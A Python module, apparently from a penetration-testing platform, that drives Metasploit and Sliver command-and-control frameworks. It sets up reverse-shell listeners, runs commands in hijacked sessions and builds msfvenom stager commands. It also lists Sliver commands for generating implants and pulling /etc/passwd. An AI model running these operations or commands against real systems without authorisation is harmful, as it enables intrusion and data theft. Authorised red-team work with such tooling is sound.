"""Command and Control framework integration engine."""

import json
import base64
from typing import Dict, Any, List, Optional
from core.database import generate_id, utc_now


class C2Engine:
    """Engine for integrating with C2 frameworks (Metasploit, Sliver, etc.)."""

    def __init__(self, db, config: dict = None):
        """Initialize the C2 engine.

        Args:
            db: Database instance
            config: Configuration dictionary
        """
        self.db = db
        self.config = (config or {}).get("engines", {}).get("c2", {})

        # C2 framework connections
        self.msf_client = None
        self.sliver_config = None

        # Session registry
        self.active_sessions = {}

        # Payload templates
        self.payload_templates = {
            "windows": {
                "meterpreter": "windows/meterpreter/reverse_tcp",
                "shell": "windows/shell/reverse_tcp",
                "staged": "windows/meterpreter/reverse_https"
            },
            "linux": {
                "meterpreter": "linux/x86/meterpreter/reverse_tcp",
                "shell": "linux/x86/shell/reverse_tcp",
                "staged": "linux/x64/meterpreter/reverse_tcp"
            },
            "macos": {
                "meterpreter": "osx/x64/meterpreter/reverse_tcp",
                "shell": "osx/x64/shell/reverse_tcp"
            },
            "python": {
                "shell": "python/meterpreter/reverse_tcp"
            },
            "php": {
                "shell": "php/meterpreter/reverse_tcp"
            }
        }

    async def connect_metasploit(
        self,
        host: str = "127.0.0.1",
        port: int = 55553,
        username: str = "msf",
        password: str = "msf",
        project_id: str = None,
        target_id: str = None
    ) -> Dict[str, Any]:
        """Connect to Metasploit RPC.

        Args:
            host: Metasploit RPC host
            port: Metasploit RPC port
            username: RPC username
            password: RPC password
            project_id: Project ID
            target_id: Optional target ID

        Returns:
            Dictionary with connection status
        """
        try:
            # Lazy import
            try:
                from pymetasploit3.msfrpc import MsfRpcClient
            except ImportError:
                return {
                    "success": False,
                    "error": "pymetasploit3 not installed. Install with: pip install pymetasploit3"
                }

            # Connect to Metasploit
            self.msf_client = MsfRpcClient(
                password=password,
                username=username,
                server=host,
                port=port,
                ssl=False
            )

            # Test connection
            version = self.msf_client.core.version

            # Audit log
            await self.db.audit(
                action="connect_metasploit",
                resource_type="c2",
                resource_id="metasploit",
                details={
                    "host": host,
                    "port": port,
                    "version": version
                },
                severity="warning"  # C2 connection is sensitive
            )

            return {
                "success": True,
                "framework": "metasploit",
                "host": host,
                "port": port,
                "version": version,
                "connected": True
            }

        except Exception as e:
            return {
                "success": False,
                "error": f"Failed to connect to Metasploit: {str(e)}",
                "suggestion": "Ensure msfrpcd is running: msfrpcd -P msf -S -a 127.0.0.1"
            }

    async def list_metasploit_modules(
        self,
        module_type: str = "exploit",
        search: str = "",
        project_id: str = None,
        target_id: str = None
    ) -> Dict[str, Any]:
        """Search Metasploit modules.

        Args:
            module_type: Module type (exploit, auxiliary, post, payload)
            search: Search query
            project_id: Project ID
            target_id: Optional target ID

        Returns:
            Dictionary with module list
        """
        try:
            if not self.msf_client:
                return {
                    "success": False,
                    "error": "Not connected to Metasploit. Use connect_metasploit first."
                }

            # Get modules based on type
            if module_type == "exploit":
                modules = self.msf_client.modules.exploits
            elif module_type == "auxiliary":
                modules = self.msf_client.modules.auxiliary
            elif module_type == "post":
                modules = self.msf_client.modules.post
            elif module_type == "payload":
                modules = self.msf_client.modules.payloads
            else:
                return {
                    "success": False,
                    "error": f"Invalid module type: {module_type}. Use: exploit, auxiliary, post, or payload"
                }

            # Filter by search query
            if search:
                modules = [m for m in modules if search.lower() in m.lower()]

            # Limit results
            max_results = 100
            total_found = len(modules)
            modules = modules[:max_results]

            return {
                "success": True,
                "module_type": module_type,
                "search_query": search,
                "modules": modules,
                "count": len(modules),
                "total_found": total_found,
                "truncated": total_found > max_results
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    async def create_metasploit_listener(
        self,
        payload: str = "windows/meterpreter/reverse_tcp",
        lhost: str = None,
        lport: int = 4444,
        options: Dict[str, Any] = None,
        project_id: str = None,
        target_id: str = None
    ) -> Dict[str, Any]:
        """Create a multi/handler listener in Metasploit.

        Args:
            payload: Payload to use
            lhost: Local host (listener IP)
            lport: Local port (listener port)
            options: Additional options
            project_id: Project ID
            target_id: Optional target ID

        Returns:
            Dictionary with listener details
        """
        try:
            if not self.msf_client:
                return {
                    "success": False,
                    "error": "Not connected to Metasploit. Use connect_metasploit first."
                }

            if not lhost:
                return {
                    "success": False,
                    "error": "lhost (listener IP) is required"
                }

            # Create exploit handler
            exploit = self.msf_client.modules.use('exploit', 'multi/handler')

            # Configure payload
            exploit['PAYLOAD'] = payload
            exploit['LHOST'] = lhost
            exploit['LPORT'] = lport

            # Set additional options
            if options:
                for key, value in options.items():
                    exploit[key] = value

            # Execute handler in background
            job = exploit.execute(payload=payload)

            listener_id = generate_id()

            # Store listener info
            listener_info = {
                "listener_id": listener_id,
                "payload": payload,
                "lhost": lhost,
                "lport": lport,
                "job_id": job.get('job_id'),
                "created_at": utc_now()
            }

            # Audit log
            await self.db.audit(
                action="create_metasploit_listener",
                resource_type="c2",
                resource_id=listener_id,
                details={
                    "payload": payload,
                    "lhost": lhost,
                    "lport": lport,
                    "project_id": project_id
                },
                severity="warning"
            )

            return {
                "success": True,
                "listener": listener_info,
                "message": f"Listener started on {lhost}:{lport}"
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    async def list_active_sessions(self, project_id: str = None, target_id: str = None) -> Dict[str, Any]:
        """List all active Metasploit sessions.

        Args:
            project_id: Project ID
            target_id: Optional target ID

        Returns:
            Dictionary with session list
        """
        try:
            if not self.msf_client:
                return {
                    "success": False,
                    "error": "Not connected to Metasploit. Use connect_metasploit first."
                }

            # Get all sessions
            sessions = self.msf_client.sessions.list

            # Parse session info
            session_list = []
            for session_id, session_info in sessions.items():
                session_list.append({
                    "session_id": session_id,
                    "type": session_info.get('type', 'unknown'),
                    "target": session_info.get('target_host', 'unknown'),
                    "username": session_info.get('username', 'unknown'),
                    "hostname": session_info.get('hostname', 'unknown'),
                    "platform": session_info.get('platform', 'unknown'),
                    "architecture": session_info.get('arch', 'unknown'),
                    "via_exploit": session_info.get('via_exploit', 'unknown'),
                    "via_payload": session_info.get('via_payload', 'unknown'),
                    "established_at": session_info.get('session_timestamp', 'unknown')
                })

            return {
                "success": True,
                "sessions": session_list,
                "total_sessions": len(session_list),
                "meterpreter_sessions": len([s for s in session_list if s["type"] == "meterpreter"]),
                "shell_sessions": len([s for s in session_list if s["type"] == "shell"])
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    async def session_command(
        self,
        session_id: str,
        command: str,
        project_id: str = None,
        target_id: str = None
    ) -> Dict[str, Any]:
        """Execute a command in an active Metasploit session.

        Args:
            session_id: Session ID
            command: Command to execute
            project_id: Project ID
            target_id: Optional target ID

        Returns:
            Dictionary with command output
        """
        try:
            if not self.msf_client:
                return {
                    "success": False,
                    "error": "Not connected to Metasploit. Use connect_metasploit first."
                }

            # Get session
            session = self.msf_client.sessions.session(session_id)

            if not session:
                return {
                    "success": False,
                    "error": f"Session {session_id} not found"
                }

            # Execute command
            output = session.write(command)

            # Read output
            result = session.read()

            # Audit log (DANGEROUS operation)
            await self.db.audit(
                action="session_command",
                resource_type="c2",
                resource_id=session_id,
                details={
                    "session_id": session_id,
                    "command": command,
                    "project_id": project_id
                },
                severity="critical"  # Command execution is critical
            )

            return {
                "success": True,
                "session_id": session_id,
                "command": command,
                "output": result
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    async def generate_stager(
        self,
        payload_type: str = "windows/meterpreter/reverse_tcp",
        lhost: str = None,
        lport: int = 4444,
        format: str = "exe",
        options: Dict[str, Any] = None,
        project_id: str = None,
        target_id: str = None
    ) -> Dict[str, Any]:
        """Generate a Metasploit payload/stager (msfvenom equivalent).

        Args:
            payload_type: Payload type
            lhost: Listener host
            lport: Listener port
            format: Output format (exe, elf, raw, python, powershell, etc.)
            options: Additional options (encoder, iterations, etc.)
            project_id: Project ID
            target_id: Optional target ID

        Returns:
            Dictionary with payload data
        """
        try:
            if not self.msf_client:
                return {
                    "success": False,
                    "error": "Not connected to Metasploit. Use connect_metasploit first."
                }

            if not lhost:
                return {
                    "success": False,
                    "error": "lhost (listener IP) is required"
                }

            # Build msfvenom command (Metasploit RPC doesn't directly support payload generation)
            # We'll return the command to run manually
            cmd_parts = [
                "msfvenom",
                f"-p {payload_type}",
                f"LHOST={lhost}",
                f"LPORT={lport}",
                f"-f {format}"
            ]

            # Add additional options
            if options:
                if options.get("encoder"):
                    cmd_parts.append(f"-e {options['encoder']}")
                if options.get("iterations"):
                    cmd_parts.append(f"-i {options['iterations']}")
                if options.get("bad_chars"):
                    cmd_parts.append(f"-b '{options['bad_chars']}'")
                if options.get("template"):
                    cmd_parts.append(f"-x {options['template']}")

            # Add output file
            output_filename = f"payload_{generate_id()[:8]}.{self._get_format_extension(format)}"
            cmd_parts.append(f"-o {output_filename}")

            msfvenom_command = " ".join(cmd_parts)

            # Audit log
            await self.db.audit(
                action="generate_stager",
                resource_type="c2",
                resource_id=generate_id(),
                details={
                    "payload_type": payload_type,
                    "lhost": lhost,
                    "lport": lport,
                    "format": format,
                    "project_id": project_id
                },
                severity="critical"  # Payload generation is critical
            )

            return {
                "success": True,
                "payload_type": payload_type,
                "lhost": lhost,
                "lport": lport,
                "format": format,
                "output_filename": output_filename,
                "msfvenom_command": msfvenom_command,
                "message": "Run the msfvenom command above to generate the payload"
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    async def connect_sliver(
        self,
        config_path: str = None,
        project_id: str = None,
        target_id: str = None
    ) -> Dict[str, Any]:
        """Connect to Sliver C2 server.

        Args:
            config_path: Path to Sliver operator config file
            project_id: Project ID
            target_id: Optional target ID

        Returns:
            Dictionary with connection template (Sliver requires gRPC setup)
        """
        try:
            # Sliver uses gRPC which requires more complex setup
            # Return configuration template and instructions

            connection_template = {
                "framework": "sliver",
                "setup_required": True,
                "instructions": [
                    "1. Start Sliver server: sliver-server",
                    "2. Generate operator config: new-operator --name operator --lhost <IP>",
                    "3. Transfer config file to client machine",
                    "4. Import config: sliver-client import <config-file>",
                    "5. Connect: sliver-client"
                ],
                "python_integration": {
                    "note": "Sliver Python integration requires sliver-py package",
                    "install": "pip install sliver-py",
                    "example_code": '''
from sliver import SliverClient

# Load operator config
config = SliverClient.load_config("operator.cfg")

# Connect
client = SliverClient(config)

# List sessions
sessions = client.sessions()

# Execute command
session = client.session(session_id)
result = session.execute("whoami")
                    '''
                },
                "common_commands": {
                    "generate_implant": "generate --mtls <IP>:8888 --save /tmp/implant",
                    "list_sessions": "sessions",
                    "use_session": "use <session-id>",
                    "execute_command": "execute whoami",
                    "download_file": "download /etc/passwd",
                    "upload_file": "upload local.exe C:\\\\Windows\\\\Temp\\\\remote.exe"
                }
            }

            # Store config if provided
            if config_path:
                self.sliver_config = {
                    "config_path": config_path,
                    "connected_at": utc_now()
                }

            # Audit log
            await self.db.audit(
                action="connect_sliver",
                resource_type="c2",
                resource_id="sliver",
                details={
                    "config_path": config_path,
                    "project_id": project_id
                },
                severity="warning"
            )

            return {
                "success": True,
                "framework": "sliver",
                "connection_template": connection_template,
                "message": "Sliver requires manual setup. See connection_template for instructions."
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    async def get_c2_status(self, project_id: str = None, target_id: str = None) -> Dict[str, Any]:
        """Get status of all connected C2 frameworks.

        Args:
            project_id: Project ID
            target_id: Optional target ID

        Returns:
            Dictionary with C2 status
        """
        try:
            status = {
                "frameworks": []
            }

            # Check Metasploit
            if self.msf_client:
                try:
                    version = self.msf_client.core.version
                    sessions = self.msf_client.sessions.list
                    jobs = self.msf_client.jobs.list

                    status["frameworks"].append({
                        "name": "metasploit",
                        "connected": True,
                        "version": version,
                        "active_sessions": len(sessions),
                        "running_jobs": len(jobs)
                    })
                except Exception as e:
                    status["frameworks"].append({
                        "name": "metasploit",
                        "connected": False,
                        "error": str(e)
                    })
            else:
                status["frameworks"].append({
                    "name": "metasploit",
                    "connected": False
                })

            # Check Sliver
            if self.sliver_config:
                status["frameworks"].append({
                    "name": "sliver",
                    "connected": True,
                    "config_loaded": True,
                    "note": "Manual gRPC connection required"
                })
            else:
                status["frameworks"].append({
                    "name": "sliver",
                    "connected": False
                })

            # Overall status
            status["total_frameworks"] = len(status["frameworks"])
            status["connected_frameworks"] = len([f for f in status["frameworks"] if f.get("connected")])

            return {
                "success": True,
                "status": status
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    # Helper methods

    def _get_format_extension(self, format: str) -> str:
        """Get file extension for payload format."""
        extensions = {
            "exe": "exe",
            "dll": "dll",
            "elf": "elf",
            "raw": "bin",
            "python": "py",
            "powershell": "ps1",
            "bash": "sh",
            "perl": "pl",
            "ruby": "rb",
            "c": "c",
            "java": "jar",
            "war": "war",
            "aspx": "aspx",
            "php": "php",
            "psh-reflection": "ps1"
        }
        return extensions.get(format, "bin")
